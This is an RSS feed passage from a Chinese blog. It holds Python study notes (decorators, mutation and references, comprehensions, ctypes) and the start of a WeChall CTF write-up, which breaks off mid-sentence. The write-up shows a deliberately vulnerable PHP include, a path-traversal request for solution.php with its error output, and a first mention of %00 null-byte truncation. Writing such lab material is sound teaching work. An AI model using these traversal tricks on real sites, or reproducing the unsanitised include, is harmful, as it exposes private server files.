class="string">'"&gt;'</span>,mids)</span><br></pre></td></tr></table></figure><p>一样进行了迭代，和兼并操作~可以得到这个一个进行拼接的一个 <code>&lt;option&gt;&lt;/option</code>&gt; 的一个列表。</p><h2 id="Set-集合"><a href="#Set-集合" class="headerlink" title="Set 集合"></a>Set 集合</h2><p>不是这里看到差点忘了 python 还有这种的数据超类型。近似于列表，但是集合元素不可重复。且可以进行集合的与或非运算哦。赶紧巩固一下初始化形势 <code>a = {1,2,3}</code></p><p><strong>如何从 一个列表里面剔除重复的元素。</strong> 集合提供了完美的解决方案！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">print(set(a))</span><br></pre></td></tr></table></figure><p>简直是。。。完美</p><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><p>正如，一般的 JS/C 的一样的存在三元运算符 <code>(Q?A:B)</code>, python 也是存在这样的一个 三元运算符，恨意很方便的实现逻辑的简单的判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A <span class="keyword">if</span> statement <span class="keyword">else</span> B</span><br></pre></td></tr></table></figure><p>与其不一样的是其判别式在中间， 左真右假。</p><p>还有一种的变体，显得比较不直观：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a,b)[statement]</span><br></pre></td></tr></table></figure><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>记得第一次 遇上这个特性是在写 <code>solidity</code>的时候遇上的，通过 装饰器的结构，可以很容易的在一个方法的外面，再给他套上一层的功能。自己之前用过如下的一个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_me</span><span class="params">(fn)</span>:</span></span><br><span class="line">    <span class="string">u'''</span></span><br><span class="line"><span class="string">    函数耗时修饰器</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.clock()</span><br><span class="line">        fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"%s cost %s second"</span>%(fn.__name__, time.clock() - start)</span><br><span class="line">    <span class="keyword">return</span> _wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span> <span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里就用到了之前的特性 <code>*args， **kwargs</code> 这个适用于传递我们的可变参数。在python 里面有句话 <strong>一切皆对象</strong> ，所以函数也如此，阅读了前面的修时器的代码，其实不难发现，其传入的是个函数，返回的也是个函数，这个返回的函数在我们的传入函数两边包裹了一些内容。实现了对函数的功能修饰。下面自己构造一个修饰器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = range(<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_decorator</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_warp</span><span class="params">(*args,**kwargs)</span>:</span></span><br><span class="line"><span class="keyword">return</span> func(*args,**kwargs)</span><br><span class="line"><span class="keyword">return</span> func_warp</span><br><span class="line"></span><br><span class="line"><span class="meta">@my_decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">app</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> filter(<span class="keyword">lambda</span> x:(x+<span class="number">1</span>)% <span class="number">2</span> == <span class="number">0</span>, a)</span><br><span class="line">print(app())</span><br></pre></td></tr></table></figure><p>这个也行是最没有用的修饰器了，只是添加了调用返回的过程，但是没有任何作用，不过这个的确实现了一个修饰器的作用，我们成功的进行了一次修饰，而且捕获了他的返回值。</p><p>还是上面的代码，注意一个使用细节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(my_decorator(app)())</span><br></pre></td></tr></table></figure><p>如果 <code>@</code> 的符号出现的太突兀，我们可以使用这样的形式来使用修饰器，很好理解~，函数传入了我们的修饰器（函数），返回了经过修饰的函数，最后再进行调用。这样完成了整个的修饰过程~。</p><hr><p>修饰器作为一个如此强大的功能，那么器具体的作用呢？其实有相当的多。比如上面给出的 一个函数计时器。在函数调用，以及函数返回 的过程来进行 计时，以及时间的打印。在 <code>Flask</code> 里面。修饰器的存在也是相当的频繁了，对于我们的路由进行直接的修饰。十分的方便。</p><h2 id="Return-与-Global"><a href="#Return-与-Global" class="headerlink" title="Return 与 Global"></a>Return 与 Global</h2><p>这个是比较常用的特性，简单讲吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> val<span class="comment"># 用于声明 全局的变量。</span></span><br></pre></td></tr></table></figure><p>return 可以返回多个返回值，而不需要在返回前先把参数进行打包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> a,b</span><br><span class="line">a,b = c()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (a,b)</span><br><span class="line">res = c()</span><br><span class="line">res[<span class="number">0</span>],res[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="对象变动-Mutation"><a href="#对象变动-Mutation" class="headerlink" title="对象变动(Mutation)"></a>对象变动(Mutation)</h2><p>这个问题是相当的有趣了，让我想到很久之前一个自己写出的一个bug，其代码示例示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line">y = [<span class="number">1</span>]</span><br><span class="line">q=[]</span><br><span class="line">p=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (range(<span class="number">3</span>)):</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    p.append(x)</span><br><span class="line">    y[<span class="number">0</span>] = y[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    q.append(y)</span><br><span class="line">print(p,q)</span><br></pre></td></tr></table></figure><p>为什么这样讲？看起来很简单的代码呀。实际上其结果是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], [[<span class="number">4</span>], [<span class="number">4</span>], [<span class="number">4</span>]])</span><br></pre></td></tr></table></figure><p>当时，挺震惊的~。 完全的不符合自己的直觉呀。实际上 这个就遇到了 深拷贝问题：</p><blockquote><p>Python 中的<strong>复杂类型的传递，是通过引用</strong>的。这个引用，就是我们最熟悉的 id （抽象化的地址）</p></blockquote><p>怎么讲呢？ 上面的代码我们稍作修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line">y = [<span class="number">1</span>]</span><br><span class="line">q=[]</span><br><span class="line">p=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (range(<span class="number">3</span>)):</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    p.append(x)</span><br><span class="line">    print(<span class="string">'x'</span>, id(x))<span class="comment"># &lt; 打印ID</span></span><br><span class="line">    y[<span class="number">0</span>] = y[<span class="number">0</span>] + i</span><br><span class="line">    q.append(y)</span><br><span class="line">    print(<span class="string">'y'</span>, id(y))<span class="comment"># &lt; 打印 ID</span></span><br><span class="line">print(p,q)</span><br></pre></td></tr></table></figure><p>其结果如下 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里我们得注意 id 的值</span><br><span class="line">(&apos;x&apos;, 72836976L)&lt; </span><br><span class="line">(&apos;y&apos;, 80438856L)</span><br><span class="line">(&apos;x&apos;, 72836952L)&lt; </span><br><span class="line">(&apos;y&apos;, 80438856L)</span><br><span class="line">(&apos;x&apos;, 72836928L)&lt; </span><br><span class="line">(&apos;y&apos;, 80438856L)</span><br></pre></td></tr></table></figure><p>过程发现 ，y 的 id 在整个过程中 都是一样的，也就是地址是一样的，然而 x 的 id 随着值得递增，在不断变化！这个就是这里的核心问题。下面进行更进一步的探索！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line">y = [<span class="number">1</span>]</span><br><span class="line">q=[]</span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccc</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (range(<span class="number">3</span>)):</span><br><span class="line">        print(<span class="string">'x'</span>, id(x))</span><br><span class="line">        x += <span class="number">1</span>;</span><br><span class="line">        p.append(x)</span><br><span class="line">        print(<span class="string">'y'</span>, id(y))</span><br><span class="line">        y[<span class="number">0</span>] = y[<span class="number">0</span>] + i</span><br><span class="line">        q.append(y)</span><br><span class="line">    print(p,q)</span><br><span class="line">print(id(x), id(y))</span><br><span class="line">ccc(x,y)</span><br></pre></td></tr></table></figure><p>这里的命名有些随意了，不过注意主要是展示问题的 嘻嘻。这段代码的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(72116104L, 82077256L)</span><br><span class="line">(&apos;x&apos;, 72116104L)&lt; </span><br><span class="line">(&apos;y&apos;, 82077256L)&lt;</span><br><span class="line">(&apos;x&apos;, 72116080L)</span><br><span class="line">(&apos;y&apos;, 82077256L)</span><br><span class="line">(&apos;x&apos;, 72116056L)</span><br><span class="line">(&apos;y&apos;, 82077256L)</span><br><span class="line">([2, 3, 4], [[4], [4], [4]])</span><br></pre></td></tr></table></figure><p>这里可以看到， 我们传入 的 int 的 ID 在函数传递后，是没有变化的，操作之后，发生了变化。然而，传入的数组的，整个过程的 ID 是没有发生变化的。所以可以确定，我们传入的是引用。所以，会导致了这样的问题产生。</p><hr><p>问题的解决：这里自己之前遇到的解决方法是使用 <strong>对象的拷贝</strong>，作为另一个变量传入，而不是引用,代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line">y = [<span class="number">1</span>]</span><br><span class="line">q=[]</span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccc</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> copy</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (range(<span class="number">3</span>)):</span><br><span class="line">        b = copy.deepcopy(y)</span><br><span class="line">        b[<span class="number">0</span>] = b[<span class="number">0</span>] + i</span><br><span class="line">        print(<span class="string">'b'</span>, id(b))</span><br><span class="line">        q.append(b)</span><br><span class="line"></span><br><span class="line">    print(p,q)</span><br><span class="line"></span><br><span class="line">print(id(x), id(y))</span><br><span class="line">ccc(x,y)</span><br></pre></td></tr></table></figure><p>这里使用了 python 的复制模块，可以实现 对象的拷贝，可以是强制的复制形参。得到的结果，就看起来正常的多：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(74868616L, 81159752L)</span><br><span class="line">(&apos;b&apos;, 81172168L)</span><br><span class="line">(&apos;b&apos;, 81160136L)</span><br><span class="line">(&apos;b&apos;, 81161160L)</span><br><span class="line">([], [[1], [2], [3]])</span><br></pre></td></tr></table></figure><hr><h2 id="内容压缩"><a href="#内容压缩" class="headerlink" title="内容压缩"></a>内容压缩</h2><ul><li><code>__slots__</code> 用于对类定义的时候，指定确定的参数。而不是</li><li><code>virtualenv</code> 建立python的虚拟环境，避免依赖混乱</li></ul><h2 id="对象自省"><a href="#对象自省" class="headerlink" title="对象自省"></a>对象自省</h2><blockquote><p>自省(introspection)，在计算机编程领域里，是指在运行时来判断一个对象的类型的能力。它是Python的强项之一。</p></blockquote><p>python 里面提供了自省的模块，我们可以使用 <code>dir</code> 可以列出了一个对象的所有的成员。</p><p><code>__doc__</code> 这个成员变量，是一般类的说明。</p><p><code>type</code> 用于查看一个对象的类型</p><p><code>id</code>可以理解为 C 里面的地址</p><h2 id="推导式-comprehensions"><a href="#推导式-comprehensions" class="headerlink" title="推导式 (comprehensions)"></a>推导式 (comprehensions)</h2><p>推导式的功能是极其强大了，可以实现十分 pythonic 的写法和功能。使用这个功能可以很轻松的对连续冗余的 for 循环，进行压缩。这里就随便贴一句，不过可读性太差了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filter(<span class="keyword">lambda</span> l: re.match(<span class="string">'.*404$'</span>, l[<span class="string">'name'</span>]),[x <span class="keyword">for</span> key <span class="keyword">in</span> cts <span class="keyword">for</span> x <span class="keyword">in</span> cts[key]]):</span><br></pre></td></tr></table></figure><p>python 的推导式的形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable = [out_exp <span class="keyword">for</span> out_exp <span class="keyword">in</span> input_list <span class="keyword">if</span> out_exp == <span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>推导式在功能上和filter 有些相似，不过，推但是在进行运算的本身，实际上也带了生成的作用，</p><p>比如下面的，快速生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">squared = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    squared.append(x**<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">squared = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line">squared = map(<span class="keyword">lambda</span> x:x**<span class="number">2</span>, range(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><h2 id="异常-Exception"><a href="#异常-Exception" class="headerlink" title="异常 Exception"></a>异常 Exception</h2><p>代码里面的异常处理是很重要的，特别是当代码的体量大了之后，异常的处理处理显得尤为重要，不好的异常处理习惯，可能直接导致后面的奇怪的问题得不到解决，之前有遇到的问题是，异常的捕获过于随意，然而又没有经过处理，所以导致了，出现问题直接没有任何会显得情况。</p><p><strong>注意如果存在，没有捕获到的异常的时候使用 raise 把异常上抛</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"><span class="keyword">raise</span></span><br></pre></td></tr></table></figure><hr><p><strong>finally</strong> 从句，用于代码段执行之后的 处理，在异常发生与否，都会被调用。</p><p><strong>try/else</strong> 从句， 用于try 中没有异常触发的情况下调用。</p><h2 id="lambda-表达式"><a href="#lambda-表达式" class="headerlink" title="lambda 表达式"></a>lambda 表达式</h2><p>这里的 <strong>lambda</strong> 的意思就是我们的函数。这里就是匿名函数的意思，这个概念在 JS 里面是大量存在的 <code>a(function(){...})</code> 。其具体的形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> x,x1,x2:...</span><br></pre></td></tr></table></figure><p>其用处在实习单行的简单函数的时候，将会显得十分优雅：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="keyword">return</span> a + b</span><br><span class="line">reduce(add, nums)</span><br><span class="line"></span><br><span class="line">reduce(<span class="keyword">lambda</span> x,y:x+y, nums)</span><br><span class="line">add1 = <span class="keyword">lambda</span> x,y:x+y</span><br><span class="line">reduce(add1, nums)</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line">a = [(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">9</span>, <span class="number">10</span>), (<span class="number">13</span>, <span class="number">-3</span>)]</span><br><span class="line">a.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p><code>lambda</code>  表达书的用处韩式相当广泛的。</p><h2 id="一行式"><a href="#一行式" class="headerlink" title="一行式"></a>一行式</h2><p>这里讲了 python 的单行的妙用吧。</p><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td><strong>简易Web Server</strong></td><td><code>python -m SimpleHTTPServer</code></td></tr><tr><td><strong>漂亮的打印</strong></td><td><code>from pprint import pprint</code></td></tr><tr><td><strong>json 解析</strong></td><td>`cat file.json</td><td>python -m json.tool`</td></tr><tr><td><strong>单行命令</strong></td><td><code>python -c</code></td></tr><tr><td><strong>列表辗平</strong></td><td><code>itertools.chain.from_iterable()</code>  传入一个二维列表</td></tr></tbody></table><h2 id="for-的-else-从句"><a href="#for-的-else-从句" class="headerlink" title="for 的 else 从句"></a>for 的 else 从句</h2><p>一个循环的退出，存在两种情况：</p><ol><li>循环到最后的结束</li><li>循环内部的 break</li></ol><p>当我们需要进行分辨这两种情况的时候，就需要一个额外的标志位。这里如果使用 else 的话满清可以很轻易的实现这个功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> iteration:</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># for 不是通过 break 结束的时候执行</span></span><br></pre></td></tr></table></figure><h2 id="Python-对-动态链接库的使用"><a href="#Python-对-动态链接库的使用" class="headerlink" title="Python 对 动态链接库的使用"></a>Python 对 动态链接库的使用</h2><p>python 可以很容易的使用系统中的动态链接库 <code>.so</code> (Shared Object)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample C file to add 2 numbers - int and floats</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_int</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add_float</span><span class="params">(<span class="keyword">float</span>, <span class="keyword">float</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_int</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add_float</span><span class="params">(<span class="keyword">float</span> num1, <span class="keyword">float</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">  gcc -shared -Wl,-soname,adder -o adder.so -fPIC add.c</span></span><br></pre></td></tr></table></figure><p>之后可以直接在 Python 从进行引用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">adder = CDLL(<span class="string">'./adder.so'</span>)</span><br><span class="line"></span><br><span class="line">res_int = adder.add_int(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Sum of 4 and 5 = "</span> + str(res_int)</span><br></pre></td></tr></table></figure><h2 id="Python-C-API"><a href="#Python-C-API" class="headerlink" title="Python/C API"></a>Python/C API</h2><p>这部分，讲了使用 C 写python 的模块，可以有更好的性能。</p><h2 id="python-协程"><a href="#python-协程" class="headerlink" title="python 协程"></a>python 协程</h2><p>协程的概念，可以理解为一个可以多次返回的函数。其关键字是 <code>yield</code> 这个关键字，我们在前面的生成器里面见过，协程至于生成器的不同，我已理解为一个进行 参数的输出的，另一个是进行输入的。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9lYXN0bGFrZXNpZGUuZ2l0Ym9va3MuaW8vaW50ZXJweS16aC9jb250ZW50L0Nvcm91dGluZXMv" title="https://eastlakeside.gitbooks.io/interpy-zh/content/Coroutines/">协程<i class="fa fa-external-link"></i></span> 参考原书内容</p></blockquote><h2 id="with-as-上下文管理结构"><a href="#with-as-上下文管理结构" class="headerlink" title="with/as 上下文管理结构"></a>with/as 上下文管理结构</h2><p>python 里面的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'some_file'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> opened_file:</span><br><span class="line">    opened_file.write(<span class="string">'Hola!'</span>)</span><br></pre></td></tr></table></figure><p>就是一个上下文管理结构， 指的是 一个结队操作中间夹杂其他代码的很好的解决方案。打开之后，在缩进结束之后，会进行自动的关闭</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/10/28/Book_interpy/#disqus_thread</comments>
    </item>
    
    <item>
      <title>WeChell_WP</title>
      <link>https://www.diglp.xyz/2018/10/21/CTF_WeChall_1/</link>
      <guid>https://www.diglp.xyz/2018/10/21/CTF_WeChall_1/</guid>
      <pubDate>Sat, 20 Oct 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;偶遇了一个网站 &lt;a href=&quot;www.wechall.net&quot;&gt;wechall.net&lt;/a&gt; ，发现是CTF
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>偶遇了一个网站 <a href="www.wechall.net">wechall.net</a> ，发现是CTF 的一个很好的入门之地。很多很经典的内容在这里学习， 还是不错的。这一篇，是这周的解题过程中的一个记录吧。</p><ul><li>WeChall    14    145    yes        104    3.74%    Oct 21, 2018 - 05:43:34    **        </li></ul><p>题目同样的覆盖很广，这里做个分类</p><hr><h2 id="EZ"><a href="#EZ" class="headerlink" title="EZ"></a>EZ</h2><p>前面基础部分就跳过了：</p><ul><li><p>view source        F12/c+o+i</p></li><li><p>Stegano            hexedit</p></li><li><p>Caesar 1            Caesar 移位</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUm9ib3RzX2V4Y2x1c2lvbl9zdGFuZGFyZA==" title="https://en.wikipedia.org/wiki/Robots_exclusion_standard">WWW-Robots<i class="fa fa-external-link"></i></span>    访问，暴露目录结构</p></li><li><p>ASCII             py进行翻译</p></li><li><p>URL                url编码</p></li><li><p>Program            在得到 内容的1.33 秒内提交到另一个地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">'https://www.wechall.net/challenge/training/programming1/index.php?action=request'</span>).success(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;<span class="keyword">var</span> x = data; $.get(<span class="string">'https://www.wechall.net/challenge/training/programming1/index.php?answer='</span>+x)&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="PHP-LFI"><a href="#PHP-LFI" class="headerlink" title="PHP LFI"></a>PHP LFI</h3><blockquote><p>之前的 白帽子里面刚刚看到，这里就用上了， 挺好~</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRmlsZV9pbmNsdXNpb25fdnVsbmUtIHJhYmlsaXR5I0xvY2FsX0ZpbGVfSW5jbHVzaW9u" title="https://en.wikipedia.org/wiki/File_inclusion_vulne- rability#Local_File_Inclusion">File inclusion vulnerability<i class="fa fa-external-link"></i></span></li></ul></blockquote><p>LFI 是本地包含漏洞，使得客户端可以非法的包含 远程服务器的本地文件。</p><hr><p>所给的提示代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="string">'pages/'</span>.(<span class="keyword">isset</span>($_GET[<span class="string">"file"</span>])?$_GET[<span class="string">"file"</span>]:<span class="string">"welcome"</span>).<span class="string">'.html'</span>;</span><br><span class="line"><span class="keyword">include</span> $filename;</span><br></pre></td></tr></table></figure><p>可见这里直接从 我们的 get 的 <code>file</code> 里面得到参数，然后进行拼接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试请求：</span></span><br><span class="line">https:<span class="comment">//www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回错误信息：</span></span><br><span class="line">PHP Warning(<span class="number">2</span>): <span class="keyword">include</span>(pages/../solution.php.html): failed to open stream: No such file <span class="keyword">or</span> directory in www/challenge/training/php/lfi/up/index.php(<span class="number">54</span>) : <span class="keyword">eval</span>()<span class="string">'d code line 1</span></span><br></pre></td></tr></table></figure><p>由于这里对我们的内容 进行了 <code>.html</code> 的拼接，所以这里又是一个点了，<code>%00截断</code></p><p>%00 实际上就是直接 ascii 